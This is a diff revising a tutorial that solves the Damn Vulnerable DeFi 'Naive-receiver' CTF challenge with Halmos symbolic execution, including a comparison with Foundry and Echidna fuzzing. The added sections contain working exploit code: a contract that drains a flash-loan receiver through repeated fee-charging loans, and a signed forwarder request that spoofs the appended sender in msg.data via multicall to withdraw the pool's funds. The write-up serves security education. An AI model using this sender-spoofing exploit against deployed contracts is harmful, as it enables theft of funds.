@@ -1,8 +1,8 @@
-# Halmos vs Truster
+# Halmos vs Naive-receiver
 ## Halmos version
 halmos 0.2.1.dev19+g4e82a90 was used in this article
 ## Foreword
-It is strongly assumed that the reader is familiar with the previous articles on solving "Unstoppable", and "Truster" (ADD LINKS), since the main ideas here are largely repeated and we will not dwell on them again.
+It is strongly assumed that the reader is familiar with the previous articles on solving ["Unstoppable"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable), and ["Truster"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster), since the main ideas here are largely repeated and we will not dwell on them again.
 ## Preparation
 ### Common prerequisites
 1. Copy NaiveReceiver.t.sol file to NaiveReceiverHalmos.t.sol. We will work in this file.
@@ -19,8 +19,8 @@ It is strongly assumed that the reader is familiar with the previous articles on
         player = address(0xcafe0001);
         ...
     ```
-4. vm.getNonce() is unsupportable cheat-code. Delete it in _isSolved() function.
-5. Create GlobalStorage contract and save all address-name pairs:
+4. **vm.getNonce()** is unsupportable cheat-code. Delete it in **_isSolved()** function.
+5. Create **GlobalStorage** contract and save all address-name pairs:
     ```solidity
     ...
     import "lib/GlobalStorage.sol";
@@ -82,7 +82,7 @@ assert( weth.balanceOf(address(receiver)) != 0 ||
         weth.balanceOf(recovery) != WETH_IN_POOL + WETH_IN_RECEIVER);
 ```
 ## Improvement of coverage
-Let's start with a single-transaction SymbolicAttacker to make sure all paths in target contracts are covered:
+Let's start with a single-transaction **SymbolicAttacker** to make sure all paths in target contracts are covered:
 ```solidity
 function check_naiveReceiver() public checkSolvedByPlayer {
     ...
@@ -163,6 +163,8 @@ First symbolic calldata call is contained in **BasicForwarder::execute**:
 ```solidity
 function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
     ...
+    bytes memory payload = abi.encodePacked(request.data, request.from);
+    ...
     assembly {
             success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
             gasLeft := gas()
@@ -183,7 +185,8 @@ contract BasicForwarder is EIP712 {
         // avoid recursion
         vm.assume(target != address(this));
         (target, newdata) = glob.get_concrete_from_symbolic(target);
-        target.call(newdata);
+        bytes memory payload = abi.encodePacked(newdata, request.from); // Don't forget about this packing
+        target.call(payload);
     }
 }
 ```
@@ -200,7 +203,7 @@ And the second such call is in **Multicall::multicall**:
 This is something new. Here we have not one call of symbolic calldata, but a whole batch. And, in fact, it is already much more difficult to cope with it. We remember how the test execution time increased dramatically when we added only 1 symbolic transaction in the previous challenge. Therefore, let's start with just one transaction instead of a full symbolic batch execution, but keep in mind that more may be needed:
 ```solidity
 // symbolic multicall
-function multicall() external virtual returns (bytes[] memory results) {
+function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
     results = new bytes[](1);
     address target = address(this);
     bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
@@ -256,7 +259,7 @@ $ halmos --solver-timeout-assertion 0 --function check_naiveReceiver --loop 4
 ...
 Killed
 ```
-Catastrophe! An hour later, Halmos simply collapsed due to out-of-memory. This is a known problem of symbolic analysis: Path Explosion (add link). Halmos could not handle the symbolic execution of 2 transactions in a setup with such 4 contracts. Here we have reached the Halmos limit, and it will not be possible to solve this problem so straightforwardly. We will have to introduce some heuristic optimizations.
+Catastrophe! An hour later, Halmos simply collapsed due to out-of-memory. This is a known problem of symbolic analysis: [Path Explosion](https://en.wikipedia.org/wiki/Path_explosion). Halmos could not handle the symbolic execution of 2 transactions in a setup with such 4 contracts. Here we have reached the Halmos limit, and it will not be possible to solve this problem so straightforwardly. We will have to introduce some optimizations.
 ## Optimizations
 First, let's look at **FlashLoanReceiver::onFlashLoan**:
 ```solidity
@@ -277,7 +280,7 @@ contract FlashLoanReceiver is IERC3156FlashBorrower {
 }
 ...
 ```
-This function is the only function of this contract. In addition, it will not be executed if **msg.sender** is not **NaiveReceiverPool**. Therefore, we can safely delete FlashLoanReceiver from GlobalStorage. And next to that, we optimize the NaiveReceiverPool logic:
+This function is the only function of this contract. In addition, it will not be executed if **msg.sender** is not **NaiveReceiverPool**. Therefore, we can safely delete **FlashLoanReceiver** from **GlobalStorage**. And next to that, we optimize the **NaiveReceiverPool** logic:
 ```solidity
 contract NaiveReceiverPool is Multicall, IERC3156FlashLender {
 ...
@@ -311,8 +314,9 @@ function execute(Request calldata request, bytes calldata signature) public paya
     ...
     // Work with "newdata" like this is the "data"
     bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
+    bytes memory payload = abi.encodePacked(newdata, request.from);
     vm.assume(target == address(0xaaaa0005));
-    target.call(newdata);
+    target.call(payload);
 }
 ```
 Next to it, there is a cryptographic check of the signature in **_checkRequest**:
@@ -324,7 +328,7 @@ function _checkRequest(Request calldata request, bytes calldata signature) priva
 }
 ```
 We already know that tools like Halmos don't do well with cryptographic checks, so we'll have to think logically here. 
-Let's remember that under the condition of the problem, we have the player's private key, which we can use to sign forward transactions here. It turns out that the only transfer.from we can pass is the player's address:
+Let's remember that under the condition of the problem, we have the player's private key, which we can use to sign forward transactions here. It turns out that the only **transfer.from** we can pass is the player's address:
 ```solidity
 function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
 ...
@@ -340,9 +344,9 @@ killed
 ```
 No, it's still too hard. Much stronger heuristics are needed.
 ## Heuristics
-We have reached the point where we can no longer operate with only stable improvements and expect Halmos to give us a clear solution to the problem in such a clear form as in past challenges. Will have to try to apply some relief by sacrificing likely scenarios that could be covered symbolically.
+We have reached the point where we can no longer operate with only stable improvements and expect Halmos to give us a solution to the problem in such a clear form as in past challenges. Will have to try to apply some relief by sacrificing likely scenarios that could be covered symbolically.
 ### Proxy heuristics
-Since **BasicForwarder** is essentially just a proxy contract for **NaiveReceiverPool**, and **multicall** is in turn a proxy function for other pool functions, we can try to sacrifice scenarios where we call functions from NaiveReceiverPool directly. On the other hand, we get the benefit of not having duplicate calls to these functions, while not reducing overall code coverage:
+Since **BasicForwarder** is essentially just a proxy contract for **NaiveReceiverPool**, and **multicall** is in turn a proxy function for other pool functions, we can try to sacrifice scenarios where we call functions from NaiveReceiverPool directly. On the other hand, we get the benefit of not having duplicate symbolic calls to these functions, while not reducing overall code coverage:
 ```solidity
 function setUp() public {
     ...
@@ -357,31 +361,257 @@ function setUp() public {
 function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
     ...
     bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
+    bytes memory payload = abi.encodePacked(newdata, request.from);
     vm.assume(target == address(0xaaaa0005));
-    vm.assume(bytes4(newdata) == bytes4(keccak256("multicall()")));
-    target.call(newdata);
+    vm.assume(bytes4(newdata) == bytes4(keccak256("multicall(bytes[])")));
+    target.call(payload);
+}
+```
+### msg.data usage hint
+Let's take a look at this piece of code in **NaiveReceiverPool**:
+```solidity
+function _msgSender() internal view override returns (address) {
+    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
+        return address(bytes20(msg.data[msg.data.length - 20:]));
+        ...
+}
+```
+Here, **msg.data** works like a normal byte array. In such cases, it is much better to use **svm.createBytes()** instead of **svm.CreateCalldata()**, if you call such a function symbolically, so that Halmos behaves more flexibly and can find more subtle bugs tied specifically to unexpected calldata crafting. The only place we can get here from is **multicall->withdraw**. Therefore, let's change our **multicall** somewhat:
+```solidity
+// symbolic multicall
+function multicall() external virtual returns (bytes[] memory results) {
+    ...
+    bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
+    ...
+    // If selector is "withdraw"
+    if (selector == bytes4(keccak256("withdraw(uint256,address)")))
+    {
+        newdata = svm.createBytes(100, "multicall_newdata");
+        vm.assume (bytes4(newdata) == selector);
+    }
+    results[0] = Address.functionDelegateCall(target, newdata);
+    return results;
+}
+```
+### A simplified invariant
+So far, we have used invariants that directly gave us the solution to the problem. But if we cannot find a direct solution, we will apply other principles. First, let's remove the condition that the assets must be on recovery. Let's rationalize it by the fact that if we can find an attack at all that will steal funds from target addresses, the way to transfer them to recovery should be obvious. As a result, we will probably save on the number of necessary symbolic transactions (for example, we will not need to call **ERC20::transfer(recovery, funds)**):
+```solidity
+function _isSolved() private view {
+    ...
+    assert( weth.balanceOf(address(receiver)) != 0 || 
+            weth.balanceOf(address(pool)) != 0 ); 
+```
+But let's go even further. Let's try to find out if we can reduce the target contract balances at all. Maybe that will give us an idea for an attack:
+```solidity
+function _isSolved() private view {
+    assert (weth.balanceOf(address(pool)) >= WETH_IN_POOL || 
+            weth.balanceOf(address(receiver)) >= WETH_IN_RECEIVER);
+}
+```
+Run:
+```javascript
+$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver
+...
+Counterexample:                                                                                                                                                                                                                           halmos_multicall_newdata_bytes_e2c4a17_67 = 0x00f714ce0000000000000000000000000000000000000000000000070800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000cafe0000
+halmos_selector_bytes4_2b51260_47 = execute
+halmos_selector_bytes4_acafed2_66 = withdraw
+halmos_selector_bytes4_e0bb9db_14 = execute
+halmos_selector_bytes4_f3c1dfe_33 = flashLoan
+halmos_target_address_2eb5185_01 = 0x00000000000000000000000000000000aaaa0004
+halmos_target_address_a486edd_34 = 0x00000000000000000000000000000000aaaa0004
+p_amount_uint256_53924bb_28 = 0x0000000000000000000000000000000000000000000000077400000000000000
+p_data_length_1638d62_30 = 0x0000000000000000000000000000000000000000000000000000000000000400
+p_receiver_address_3b7cd58_26 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
+p_request.from_address_d094f2c_04 = 0x00000000000000000000000000000000000000000000000000000000cafe0001
+p_request.from_address_fa75348_37 = 0x00000000000000000000000000000000000000000000000000000000cafe0001
+p_request.target_address_9cc3344_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
+p_request.target_address_c287625_38 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
+p_signature_length_7e37d64_13 = 0x0000000000000000000000000000000000000000000000000000000000000041
+p_signature_length_fb058e7_46 = 0x0000000000000000000000000000000000000000000000000000000000000000
+p_token_address_a8696b9_27 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
+...
+[FAIL] check_naiveReceiver() (paths: 20371, time: 1592.14s, bounds: [])
+```
+Counterexample is found!
+## Counterexample analysis
+This time we will not analyze each line of the counterexample in detail. Note that 2 bugs were found here at once.
+The mechanics of the first bug are quite simple - we launch **flashLoan**, as the receiver we specify the **FlashLoanReceiver** contract, which we do not own, thereby emptying it by 1 **WETH** per transaction. Precisely because it takes 10 such transactions to empty this balance to 0 - Halmos failed with a clearer invariant.
+The mechanics of the second bug are very interesting. The fact is that for this we need to fulfill 2 conditions: run **withdraw** with **Forwarder** as a **msg.sender**, but at the same time bypass the concatenation of our address at the end of the **payload**:
+```solidity
+bytes memory payload = abi.encodePacked(newdata, request.from);
+...
+target.call(payload);
+```
+```solidity
+if (msg.sender == trustedForwarder && msg.data.length >= 20) {
+    return address(bytes20(msg.data[msg.data.length - 20:]));
+}
+```
+And Halmos did find a scenario: it needs to be called from under multicall, which will allow us to withdraw on behalf of the **Forwarder** (via **delegateCall**), while withdrawing funds to an arbitrary receiver, emptying the balance of an arbitrary address, inserting it at the end of data. For this we needed the hint from **svm.createBytes()** earlier.
+## Using a counterexample
+Let's use the **attacker** to devastate the **FlashLoanReceiver**:
+```solidity
+pragma solidity =0.8.25;
+
+import {NaiveReceiverPool, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
+import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
+
+contract Attacker {
+    function attack(NaiveReceiverPool pool, FlashLoanReceiver receiver, WETH weth) public {
+        for (uint256 i = 0; i < 10; i++) {
+            pool.flashLoan(receiver, address(weth), 1, "b1bab0ba");
+        }
+    }
+} 
+```
+```solidity
+function test_naiveReceiver() public checkSolvedByPlayer {
+    Attacker attacker = new Attacker();
+    attacker.attack(pool, receiver, weth);
+    ...
+}
+```
+Now we send all pool funds to recovery. We remember that we ignored the player's private key when testing through Halmos. The real attack, of course, requires us to craft a valid request to the **Forwarder**. This time we won't use an **attacker** contract. We don't want to transfer our private key to some contract :)
+```solidity
+function test_naiveReceiver() public checkSolvedByPlayer {
+...
+    bytes[] memory callDatas = new bytes[](1);
+    callDatas[0] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+        bytes32(uint256(uint160(deployer)))
+    );
+    bytes memory callData;
+    callData = abi.encodeCall(pool.multicall, callDatas);
+    BasicForwarder.Request memory request = BasicForwarder.Request(
+        player,
+        address(pool),
+        0,
+        30000000,
+        forwarder.nonces(player),
+        callData,
+        1 days
+    );
+    bytes32 requestHash = keccak256(
+        abi.encodePacked(
+            "\x19\x01",
+            forwarder.domainSeparator(),
+            forwarder.getDataHash(request)
+        )
+    );
+    (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
+    bytes memory signature = abi.encodePacked(r, s, v);
+    require(forwarder.execute(request, signature));
+}
+```
+Since we crafted the request ourselves, because we couldn't use calldata from Halmos for obvious reasons - I just copied this request from [here](https://medium.com/@opensiddhu993/challenge-2-naive-receiver-damn-vulnerable-defi-v4-lazy-solutions-series-8b3b28bc929d) :).
+h/t @siddharth9903
+
+```javascript
+$ forge test -vv --mp test/naive-receiver/NaiveReceiver.t.sol
+...
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.53ms (1.50ms CPU time)
+```
+Did it!
+## Compare with fuzzing
+We can find foundry-based, echidna-based and meduza-based solutions to this problem [here](https://github.com/devdacian/solidity-fuzzing-comparison/tree/main/test/01-naive-receiver)
+However, I haven't found any solutions for the updated version of Naive-receiver (v4). The fact is that a second bug was added in the new version, which is tied precisely to the calldata craft and in **"Truster"** it almost became a blocker. Therefore, let's check whether there are fuzzers at all are able to work out the following logic.
+### Target
+First, write this POCTarget contract:
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity =0.8.25;
+
+contract POCTarget {
+    uint256 public a;
+    
+    constructor() {
+        a = 0;
+    }
+
+    function proxycall (bytes calldata data) public {
+        address(this).call(data);
+    }
+
+    function changea () public {
+        if (msg.sender != address(this)) {
+            revert();
+        }
+        if (address(bytes20(msg.data[msg.data.length - 20:])) == address(this)) {
+            a = 1;
+        }
+    }
+}
+```
+If the fuzzer supports such logic, it will find a counterexample where a==1.
+### Foundry
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity =0.8.25;
+
+import "./POCTarget.sol";
+import {Test, console} from "forge-std/Test.sol";
+
+contract POCFuzzing is Test {
+    POCTarget target;
+    address deployer = makeAddr("deployer");
+
+    function setUp() public {
+        startHoax(deployer);
+        target = new POCTarget();
+        vm.stopPrank();
+        targetSender(deployer);
+    }
+
+    function invariant_isWorking() public {
+        assert (target.a() != 1);
+    }
 }
 ```
 ```javascript
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
+$ forge test -vv --mp test/naive-receiver/POCFuzzing.t.sol
+...
+[PASS] invariant_isWorking() (runs: 1000, calls: 500000, reverts: 249958)
 ```
+Not working
+### Echidna
+```javascript
+deployer: '0xcafe0001' 
+sender: ['0xcafe0002']
+allContracts: true
+workers: 8
+```
+```solidity
+// SPDX-License-Identifier: MIT
+
+pragma solidity =0.8.25;
+
+import "./POCTarget.sol";
+import {Test, console} from "forge-std/Test.sol";
+
+contract POCFuzzing is Test {
+    POCTarget target;
+    address deployer = makeAddr("deployer");
+
+    constructor() public payable {
+        target = new POCTarget();
+    }
+
+    function echidna_isWorking() public returns (bool) {
+        return target.a() != 1;
+    }
+}
+```
+```javascript
+echidna test/naive-receiver/POCEchidna.t.sol --contract POCEchidna --config test/naive-receiver/naive-receiver.yaml --test-limit 10000000
+...
+echidna_isWorking: passing
+...
+```
+Also not working. I think these results are enough to prove that Foundry and Echidna fuzzing would not cope with the new bug.
+## Conclusions
+1. Path explosion is a really serious problem of symbolic analysis. We had a setup of 4 not the largest contracts, but Halmos was unable to complete 2 transactions symbolically without serious simplifications.
+2. You can and should use simplifications and optimizations. Sometimes nothing will work without it. The main thing is to choose heuristics successfully.
+3. When creating invariants, you can follow the principle "If we can do something UNEXPECTED - we will easily find a full-fledged attack".
+4. It is important to understand when it is better to use **svm.CreateCalldata()** and when to use **svm.createBytes()**. Each has its own unique areas of application.
+5. Even given that we gave a strong hint that svm.createBytes() should be used at withdraw-> function, Halmos did a great job of handling the raw calldata to find a bug, unlike Echidna and Foundry. The new version of Naive-receiver is not completely solved by fuzzing.
